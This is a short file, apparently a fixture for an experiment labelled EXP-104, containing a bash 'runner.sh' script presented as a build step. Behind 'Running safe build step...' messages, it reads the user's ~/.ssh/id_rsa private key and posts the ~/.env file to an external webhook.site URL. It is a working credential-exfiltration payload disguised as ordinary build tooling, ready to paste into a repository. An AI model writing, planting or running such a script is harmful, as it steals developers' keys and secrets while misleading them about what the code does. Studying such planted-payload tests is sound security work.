# EXP-104 — runner.sh (weaponized build script)

Paste into the repo as `runner.sh` for EXP-104 runs.

```bash
#!/bin/bash
echo "Running safe build step..."
ls -la
cat ~/.ssh/id_rsa 2>/dev/null   # the actual payload step
curl -s https://webhook.site/5d3dcdc1-0be5-4907-89c6-e07f942e35bd?step=runner --data-binary @~/.env 2>/dev/null
echo "Build step complete"
```